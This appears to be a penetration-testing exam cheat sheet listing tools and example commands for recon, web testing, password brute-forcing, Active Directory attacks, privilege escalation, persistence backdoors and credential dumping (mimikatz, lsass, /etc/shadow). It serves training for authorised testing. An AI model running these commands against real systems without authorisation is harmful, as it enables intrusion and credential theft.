- **Passive Recon**: 
  - `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`
- **Active Recon**:
  - `nmap -sC -sV -A -T4 target`  # Service/version detection, OS detection
  - `rustscan -a target -- -sV -O`  # Fast port scan
  - `dig domain.com`, `nslookup domain.com`, `host domain.com`
  - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
  - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
  - **Subnetting**: Know how to calculate IP ranges (e.g., 192.168.1.0/24)

## Web Application Testing

- **OWASP Top 10**: SQLi, XSS, IDOR, SSRF, File Upload, etc.
- **Tools**: `sqlmap`, `dalfox`, `xsstrike`, `ffuf`, `gobuster`, `nikto`, `wpscan`, `burpsuite`
- **File Upload Bypass**: Try `.php`, `.php.jpg`, `.phtml`, change Content-Type in Burp
- **Bypass Client-Side Controls**: Disable JavaScript, intercept/modify requests in Burp
- **Manual Testing**: Try all HTTP methods, test for parameter pollution, hidden fields

## Network Penetration Testing

- **Service Enumeration**:
  - **SMB**: `enum4linux -a target`, `smbclient -L //target/`
  - **FTP**: `hydra -l user -P wordlist ftp://target`
  - **SNMP**: `snmpwalk -v2c -c public target`
  - **RDP**: `xfreerdp /u:user /p:pass /v:target`
- **Password Attacks**: `hydra`, `medusa`, `crackmapexec`
- **Traffic Sniffing**: `tcpdump -i eth0 -w capture.pcap`, `wireshark`, `mitmproxy`

## Active Directory Exploitation

- **BloodHound**: `neo4j console & bloodhound &`, `SharpHound.exe -c all`
- **Kerberoasting**: `GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x`
- **AS-REP Roasting**: `GetNPUsers.py domain/ -usersfile users.txt -no-pass`
- **Windows Enumeration**: `net user /domain`, `net group "Domain Admins" /domain`, `whoami`, `dsquery`
- **Lateral Movement**: `PsExec`, `wmiexec.py`, RDP basics

## Exploitation & Post-Exploitation

- **Privilege Escalation**:
  - **Linux**: `linpeas.sh`, check SUID, cron jobs, kernel exploits
  - **Windows**: `winPEAS.exe`, `mimikatz`, `secretsdump.py`, check services, registry
- **Persistence**:
  - **Linux**: Add cron job, SSH key, backdoor binary
  - **Windows**: Registry run keys, startup folder, scheduled tasks
- **Credential Dumping**:
  - `mimikatz`, `secretsdump.py`, `samdump2`, `/etc/shadow`, `lsass` dump
- **Host Recon**:
  - `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`

## Reporting & Exam Strategy

- **Note-Taking**: Use Markdown, CherryTree, Obsidian, or text files. Take screenshots (`gnome-screenshot`, `scrot`).
- **Reporting**: Prepare a template with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation
- **Time Management**:
  - Triage: Identify high-value targets first
  - Timebox: Don't get stuck—move on and return later
  - Document as you go

## Quick Reference Table

| Tool         | Purpose                        | Example Command                        |
|--------------|-------------------------------|----------------------------------------|
| nmap         | Port scanning                 | nmap -sC -sV -A -T4 target            |
| gobuster     | Directory brute-forcing       | gobuster dir -u URL -w wordlist       |
| hydra        | Password brute-forcing        | hydra -l user -P passlist ssh://host  |
| enum4linux   | SMB enumeration               | enum4linux -a target                  |
| bloodhound   | AD enumeration                | SharpHound.exe -c all                 |
| sqlmap       | SQL injection                 | sqlmap -u URL --dbs                   |
| linpeas      | Linux privesc                 | ./linpeas.sh > out.txt                |
| winPEAS      | Windows privesc               | winPEAS.exe > out.txt                 |
| mimikatz     | Credential dumping (Windows)  | mimikatz                              |
| tcpdump      | Packet capture                | tcpdump -i eth0 -w out.pcap           |

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---
